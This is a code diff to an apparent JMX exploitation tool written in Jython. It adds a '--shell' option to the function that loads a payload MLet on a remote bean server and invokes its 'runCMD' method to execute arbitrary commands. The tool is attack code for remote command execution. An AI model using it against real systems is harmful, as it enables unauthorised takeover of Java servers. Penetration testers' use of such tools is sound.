@@ -291,11 +291,11 @@ def changePassword(password, newpass, bean_server):
 
 def commandMode(args):
     bean_server = connectToJMX(args)
-    executeCommand(args.password, args.cmd, bean_server)
+    executeCommand(args.password, args.cmd, bean_server, args.shell)
     print "[+] Done"
 
 
-def executeCommand(password, cmd, bean_server):
+def executeCommand(password, cmd, bean_server, shell):
     # Payload execution
     # Load the Payload MLet and invoke a method on it
     mlet_bean = bean_server.getObjectInstance(
@@ -303,14 +303,16 @@ def executeCommand(password, cmd, bean_server):
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing command: " + cmd
-    inv_array1 = jarray.zeros(2, Object)
+    inv_array1 = jarray.zeros(3, Object)
     inv_array1[0] = password
     inv_array1[1] = cmd
+    inv_array1[2] = shell
 
-    inv_array2 = jarray.zeros(2, String)
+    inv_array2 = jarray.zeros(3, String)
     inv_array2[0] = String.canonicalName
     inv_array2[1] = String.canonicalName
-
+    inv_array2[2] = String.canonicalName
+    
     resource = bean_server.invoke(
         mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
 
@@ -576,6 +578,7 @@ parser.add_argument('--jmxrole', help='remote JMX role')
 parser.add_argument('--jmxpassword', help='remote JMX password')
 parser.add_argument('--jmxmp', action='store_true',
                     help='Use JMX Message Protocol')
+parser.add_argument('--shell', help='run with custom shell')
 parser.add_argument('--rmiObjectName', help='RMI name of the JMX endpoint', default='jmxrmi')
 parser.add_argument('--localhost_bypass',
                     default=None,
